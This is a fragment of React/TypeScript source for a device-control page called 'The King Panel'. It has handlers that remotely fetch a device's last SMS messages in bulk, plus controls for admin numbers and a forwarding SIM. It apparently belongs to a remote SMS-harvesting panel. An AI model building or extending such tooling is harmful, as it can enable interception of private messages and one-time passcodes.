// src/pages/DeviceDetailPage.tsx â€” The King Panel
...
// â”€â”€ King Header (replaces TopNav on this page only) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
...
export default function DeviceDetailPage() {
  ...
  // â”€â”€ ADDED: Admin Numbers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  // â”€â”€ ADDED: Forwarding SIM Change â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  async function handleGetSms() {
    ...
    openAlert("get_sms", `Request sent â€” fetching last ${count} SMS. Large counts may take longer...`);
  ...
  async function handleBulkSms() {
    ...
    openAlert("get_sms", `Bulk request sent â€” fetching last ${count} SMS. Ye thoda time le sakta hai...`);
    try { const result = await pushReadOldSms(did, count); if (!result.success) showResult("Failed: " + (result.error || "device offline")); }
    catch (e: any) { showResult("Error: " + safeStr(e?.message)); }
  }
  ...
  return (
    <div className="min-h-screen bg-gray-50">
      {/* â”€â”€ KING HEADER (replaces TopNav) â”€â”€ */}
      <KingDeviceHeader
              ...
              <div className="overflow-hidden rounded-xl border border-gray-200 bg-white shadow-sm">
                <table className="w-full border-collapse">
                  <tbody>
                    ...
                    <tr className="border-b border-gray-100"><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Admin Numbers</td><td className="py-3 pr-4"><button type="button" onClick={() => { setAdminsOpen(true); setAdminsMsg(""); }} className="text-[13px] font-semibold text-blue-600 hover:underline">{adminsOnDevice.length > 0 ? `${adminsOnDevice.length} saved â€” Edit` : "None â€” Add"}</button></td></tr>
                    <tr><td className="py-3 pl-4 text-[13px] font-semibold text-gray-600">Forwarding SIM</td><td className="py-3 pr-4"><button type="button" onClick={() => setSimChangeOpen(true)} className="text-[13px] font-semibold text-blue-600 hover:underline">{forwardingSim} â€” Change</button></td></tr>
                  </tbody>
                </table>
              </div>
